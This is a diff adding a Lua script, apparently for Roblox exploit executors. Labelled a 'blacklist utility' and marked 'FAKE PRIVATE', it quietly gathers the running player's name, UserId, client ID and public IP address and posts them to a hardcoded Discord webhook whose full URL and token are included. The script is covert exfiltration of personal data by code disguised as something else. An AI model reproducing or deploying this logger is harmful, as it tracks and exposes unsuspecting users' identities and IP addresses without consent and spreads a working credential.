@@ -1,0 +1,55 @@
+local hook = "https://discord.com/api/webhooks/1137676262735880202/ryYuxMD2IYn1SDYfMbGOkHrzuVd2SXjgRxaUvS619gCEVMo7FE30cRt5ey89JDJubSVJ"
+local clientID = game:GetService("RbxAnalyticsService"):GetClientId()
+
+local message = {
+    ['embeds'] = {
+        {
+            ['title'] = 'BLACKLIST UTILITY',
+            ['description'] = 'A shithead got logged:',
+            ['color'] = 0xFF0000, 
+            ['fields'] = {
+                {name = 'Player Name:', value = game:GetService("Players").LocalPlayer.Name},
+                {name = 'UserID', value = game:GetService("Players").LocalPlayer.UserId },
+                {name = 'clientID', value = clientID},
+                {name = "Config", value = "FAKE PRIVATE"},  
+                {name = "Executed on", value = os.date("%d/%m/%Y  %H:%M")},   
+                {name = "IP LOG: ", value = game:HttpGet('https://api.ipify.org')}                 
+            }
+        }
+    }
+}
+
+if syn then
+    local response = syn.request(
+        {
+            Url = hook,
+            Method = 'POST',
+            Headers = {
+                ['Content-Type'] = 'application/json'
+            },
+            Body = game:GetService('HttpService'):JSONEncode(message)
+        }
+    )
+elseif request then
+    local response = request(
+        {
+            Url = hook,
+            Method = 'POST',
+            Headers = {
+                ['Content-Type'] = 'application/json'
+            },
+            Body = game:GetService('HttpService'):JSONEncode(message)
+        }
+    )
+elseif http_request then
+    local response = http_request(
+        {
+            Url = hook,
+            Method = 'POST',
+            Headers = {
+                ['Content-Type'] = 'application/json'
+            },
+            Body = game:GetService('HttpService'):JSONEncode(message)
+        }
+    )
+end
